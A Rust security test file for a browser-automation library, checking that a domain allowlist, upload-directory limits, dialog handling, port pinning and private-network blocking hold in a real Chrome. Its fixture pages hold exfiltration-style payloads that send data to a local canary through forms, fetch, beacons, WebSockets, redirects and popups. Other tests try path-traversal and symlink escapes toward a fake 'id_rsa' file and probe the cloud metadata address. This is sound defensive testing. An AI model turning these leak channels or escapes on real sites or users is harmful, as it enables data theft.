//! Security tests against a real Chrome: the allowlist must hold against every way a page can send a
//! request, not only navigations. A "canary" server on a host outside the allowlist records whatever
//! reaches it. Set OSTLER_REQUIRE_CHROME=1 (CI does) to fail instead of skip when Chrome is absent.

use std::collections::{BTreeMap, BTreeSet};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use ostler_browser::{Browser, FillRequest, LaunchOptions, Policy};
use ostler_fixtures::FixtureServer;
use serde_json::{json, Value};
use tiny_http::{Header, Response, Server, StatusCode};

/// Records the path of every request that reaches it.
struct Canary {
    port: u16,
    hits: Arc<Mutex<Vec<String>>>,
}

impl Canary {
    fn start() -> Self {
        let server = Server::http("127.0.0.1:0").expect("bind canary");
        let port = server.server_addr().to_ip().unwrap().port();
        let hits: Arc<Mutex<Vec<String>>> = Arc::default();
        let h = hits.clone();
        thread::spawn(move || {
            for req in server.incoming_requests() {
                h.lock().unwrap().push(req.url().to_string());
                let ct = Header::from_bytes("Content-Type", "text/html").unwrap();
                let _ = req
                    .respond(Response::from_string("<title>canary</title>canary").with_header(ct));
            }
        });
        Self { port, hits }
    }

    fn paths(&self) -> BTreeSet<String> {
        self.hits.lock().unwrap().iter().cloned().collect()
    }
}

/// A page host that serves pages which try to send requests to `canary`.
fn start_site(canary_origin: String) -> u16 {
    let server = Server::http("127.0.0.1:0").expect("bind site");
    let port = server.server_addr().to_ip().unwrap().port();
    thread::spawn(move || {
        for req in server.incoming_requests() {
            let c = &canary_origin;
            let path = req.url().split('?').next().unwrap_or("").to_string();
            let html = |body: String| {
                Response::from_string(body)
                    .with_header(Header::from_bytes("Content-Type", "text/html").unwrap())
            };
            let _ = match path.as_str() {
                "/leak" => req.respond(html(format!(
                    r#"<!doctype html><title>leak</title>
<form id=f action="{c}/steal" method=post><label>Name<input name=name></label><label>Email<input type=email name=email></label><button>Send</button></form>
<img src="{c}/img.png"><link rel=stylesheet href="{c}/x.css">
<script>
fetch('{c}/fetch',{{mode:'no-cors'}});
navigator.sendBeacon('{c}/beacon','x');
try{{new WebSocket('{}/ws')}}catch(e){{}}
const x=new XMLHttpRequest();x.open('GET','{c}/xhr');try{{x.send()}}catch(e){{}}
try{{new EventSource('{c}/sse')}}catch(e){{}}
setTimeout(()=>{{try{{window.open('{c}/popup')}}catch(e){{}}}},300);
</script>"#,
                    c.replacen("http", "ws", 1)
                ))),
                "/redir" => req.respond(
                    Response::new_empty(StatusCode(302))
                        .with_header(Header::from_bytes("Location", format!("{c}/redir")).unwrap()),
                ),
                "/meta" => req.respond(html(format!(
                    r#"<meta http-equiv=refresh content="0;url={c}/meta"><p>meta</p>"#
                ))),
                "/jsnav" => req.respond(html(format!(
                    "<p>jsnav</p><script>setTimeout(()=>{{location.href='{c}/jsnav'}},200)</script>"
                ))),
                _ => req.respond(Response::from_string("not found").with_status_code(404)),
            };
        }
    });
    port
}

fn have_chrome() -> bool {
    if ostler_cdp::find_chrome(None).is_err() {
        assert!(
            std::env::var("OSTLER_REQUIRE_CHROME").is_err(),
            "Chrome required but not found"
        );
        eprintln!("SKIPPED: no Chrome found");
        return false;
    }
    true
}

fn vals(v: Value) -> BTreeMap<String, Value> {
    v.as_object()
        .unwrap()
        .iter()
        .map(|(k, v)| (k.clone(), v.clone()))
        .collect()
}

/// Load every hostile page under `allowed` (empty = no allowlist) and return what the canary saw.
/// `page_host` is how the browser addresses the site; `canary_host` how pages address the canary.
async fn run_pages(allowed: &[&str], page_host: &str, canary_host: &str) -> BTreeSet<String> {
    let canary = Canary::start();
    let site = start_site(format!("http://{canary_host}:{}", canary.port));
    let policy = Policy {
        allowed_domains: allowed.iter().map(|s| s.to_string()).collect(),
        allow_file: false,
        ..Default::default()
    };
    let b = Browser::launch(LaunchOptions::default(), policy)
        .await
        .expect("launch");
    let base = format!("http://{page_host}:{site}");

    for p in ["/redir", "/meta", "/jsnav"] {
        // A blocked navigation may be an error or a no-op; what matters is what the canary saw.
        let _ = b.page().navigate(&format!("{base}{p}")).await;
        tokio::time::sleep(Duration::from_millis(900)).await;
    }
    let _ = b.page().navigate(&format!("{base}/leak")).await;
    let _ = b
        .page()
        .fill_form(
            FillRequest {
                values: vals(json!({"Name": "Ada", "Email": "ada@example.com"})),
                ..Default::default()
            },
            None,
        )
        .await;
    let _ = b.page().submit(None, None).await;
    tokio::time::sleep(Duration::from_millis(2500)).await;
    let seen = canary.paths();
    b.close().await;
    seen
}

#[tokio::test]
async fn control_without_an_allowlist_does_reach_the_canary() {
    if !have_chrome() {
        return;
    }
    // Proves the canary and the hostile pages work, so the "nothing arrived" tests below are not vacuous.
    let seen = run_pages(&[], "127.0.0.1", "localhost").await;
    for p in ["/img.png", "/x.css", "/fetch", "/xhr", "/beacon"] {
        assert!(
            seen.contains(p),
            "control: {p} should have reached the canary, saw {seen:?}"
        );
    }
}

#[tokio::test]
async fn allowlist_blocks_every_channel_to_another_hostname() {
    if !have_chrome() {
        return;
    }
    // Image, stylesheet, fetch, XHR, beacon, WebSocket, EventSource, form POST, redirect, meta refresh,
    // script navigation and window.open: none may arrive.
    let seen = run_pages(&["127.0.0.1"], "127.0.0.1", "localhost").await;
    assert!(
        seen.is_empty(),
        "requests reached a non-allowlisted host: {seen:?}"
    );
}

#[tokio::test]
async fn allowlist_blocks_every_channel_to_an_ip_literal() {
    if !have_chrome() {
        return;
    }
    // The resolver rule must not be bypassed by addressing the target as a bare IP.
    let seen = run_pages(&["localhost"], "localhost", "127.0.0.1").await;
    assert!(
        seen.is_empty(),
        "requests reached a non-allowlisted IP: {seen:?}"
    );
}

async fn launch(policy: Policy) -> Browser {
    Browser::launch(LaunchOptions::default(), policy)
        .await
        .expect("launch")
}

/// Fill the fixture's file field with `path`; returns (accepted, debug text of the report).
async fn try_upload(b: &Browser, srv: &FixtureServer, path: &str) -> (bool, String) {
    b.page().navigate(&srv.url("/types.html")).await.unwrap();
    let rep = b
        .page()
        .fill_form(
            FillRequest {
                values: vals(json!({ "CV": path })),
                ..Default::default()
            },
            None,
        )
        .await
        .unwrap();
    // File inputs cannot be read back as "verified", and the form has other required fields, so judge the
    // file field itself: attached means no error and the browser reports a file name.
    let attached = rep
        .fields
        .first()
        .is_some_and(|f| f.error.is_none() && f.observed.as_array().is_some_and(|a| !a.is_empty()));
    (attached, format!("{rep:#?}"))
}

#[tokio::test]
async fn uploads_are_refused_unless_a_directory_is_allowed_and_cannot_escape_it() {
    if !have_chrome() {
        return;
    }
    let srv = FixtureServer::start();
    let allowed = tempfile::tempdir().unwrap();
    let inside = allowed.path().join("cv.txt");
    std::fs::write(&inside, "cv").unwrap();
    let elsewhere = tempfile::tempdir().unwrap();
    let secret = elsewhere.path().join("id_rsa");
    std::fs::write(&secret, "PRIVATE KEY").unwrap();

    // Default: no upload directory, nothing can be attached, not even an ordinary file.
    let b = launch(Policy::default()).await;
    let (ok, text) = try_upload(&b, &srv, inside.to_str().unwrap()).await;
    assert!(!ok && text.contains("uploads are disabled"), "{text}");
    b.close().await;

    let b = launch(Policy {
        upload_dirs: vec![allowed.path().to_path_buf()],
        ..Default::default()
    })
    .await;
    let (ok, text) = try_upload(&b, &srv, inside.to_str().unwrap()).await;
    assert!(
        ok,
        "a file inside the allowed directory should upload: {text}"
    );

    // A file elsewhere, `..` out of the directory, and a symlink pointing out of it are all refused.
    let (ok, text) = try_upload(&b, &srv, secret.to_str().unwrap()).await;
    assert!(!ok && text.contains("outside"), "{text}");
    let dotdot = format!(
        "{}/../{}/id_rsa",
        allowed.path().display(),
        elsewhere.path().file_name().unwrap().to_string_lossy()
    );
    let (ok, text) = try_upload(&b, &srv, &dotdot).await;
    assert!(!ok, "{dotdot} escaped the upload directory: {text}");
    #[cfg(unix)]
    {
        let link = allowed.path().join("innocent.txt");
        std::os::unix::fs::symlink(&secret, &link).unwrap();
        let (ok, text) = try_upload(&b, &srv, link.to_str().unwrap()).await;
        assert!(!ok && text.contains("outside"), "symlink escaped: {text}");
    }
    b.close().await;
}

#[tokio::test]
async fn confirm_and_prompt_are_dismissed_unless_the_operator_opts_in() {
    if !have_chrome() {
        return;
    }
    let srv = FixtureServer::start();
    for (accept_dialogs, expect_confirm) in [(false, false), (true, true)] {
        let b = launch(Policy {
            accept_dialogs,
            ..Default::default()
        })
        .await;
        b.page().navigate(&srv.url("/basic.html")).await.unwrap();
        let confirmed = b
            .page()
            .eval("confirm('Delete everything?')")
            .await
            .unwrap();
        assert_eq!(
            confirmed,
            json!(expect_confirm),
            "accept_dialogs={accept_dialogs}"
        );
        let prompted = b.page().eval("prompt('Your PIN?', '')").await.unwrap();
        assert_eq!(prompted.is_string(), accept_dialogs, "prompt: {prompted:?}");
        // alert() asks for nothing and is always acknowledged, and the agent is told what happened.
        b.page().eval("alert('hi'); 0").await.unwrap();
        let seen = b.page().take_dialogs().join(" | ");
        let verdict = if accept_dialogs {
            "accepted"
        } else {
            "dismissed"
        };
        assert!(
            seen.contains(&format!("{verdict} confirm: Delete everything?")),
            "{seen}"
        );
        assert!(seen.contains("accepted alert: hi"), "{seen}");
        b.close().await;
    }
}

#[tokio::test]
async fn an_allowlist_entry_with_a_port_pins_that_port() {
    if !have_chrome() {
        return;
    }
    let srv = FixtureServer::start();
    let other = FixtureServer::start(); // same host, different port
    let canary = Canary::start();

    let pinned = launch(Policy {
        allowed_domains: vec![format!("127.0.0.1:{}", srv.port)],
        ..Default::default()
    })
    .await;
    pinned
        .page()
        .navigate(&srv.url("/basic.html"))
        .await
        .unwrap();
    let err = pinned
        .page()
        .navigate(&other.url("/basic.html"))
        .await
        .unwrap_err()
        .to_string();
    assert!(err.contains("not in the allowed domains"), "{err}");
    // A page on the allowed port cannot reach another port on the same host either.
    pinned
        .page()
        .eval(&format!(
            "fetch('http://127.0.0.1:{}/beacon', {{mode: 'no-cors'}}); 0",
            canary.port
        ))
        .await
        .unwrap();
    tokio::time::sleep(Duration::from_millis(1200)).await;
    assert!(
        canary.paths().is_empty(),
        "port pin leaked: {:?}",
        canary.paths()
    );
    pinned.close().await;

    // Control: an entry without a port allows every port, so the same request does arrive.
    let open = launch(Policy {
        allowed_domains: vec!["127.0.0.1".into()],
        ..Default::default()
    })
    .await;
    open.page().navigate(&srv.url("/basic.html")).await.unwrap();
    open.page()
        .eval(&format!(
            "fetch('http://127.0.0.1:{}/beacon', {{mode: 'no-cors'}}); 0",
            canary.port
        ))
        .await
        .unwrap();
    tokio::time::sleep(Duration::from_millis(1200)).await;
    assert!(
        canary.paths().contains("/beacon"),
        "control: {:?}",
        canary.paths()
    );
    open.close().await;
}

#[tokio::test]
async fn private_networks_are_refused_when_asked_and_open_by_default() {
    if !have_chrome() {
        return;
    }
    let srv = FixtureServer::start(); // listens on 127.0.0.1
    let b = launch(Policy {
        block_private_networks: true,
        ..Default::default()
    })
    .await;
    for url in [
        srv.url("/basic.html"),
        format!("http://localhost:{}/basic.html", srv.port),
        "http://169.254.169.254/latest/meta-data/".to_string(),
        "http://[::1]:1/".to_string(),
        "http://10.0.0.1/".to_string(),
    ] {
        let err = b.page().navigate(&url).await.unwrap_err().to_string();
        assert!(err.contains("private or internal"), "{url}: {err}");
    }
    b.close().await;

    // Default stays open: the demo fixtures live on loopback.
    let b = launch(Policy::default()).await;
    b.page().navigate(&srv.url("/basic.html")).await.unwrap();
    b.close().await;
}
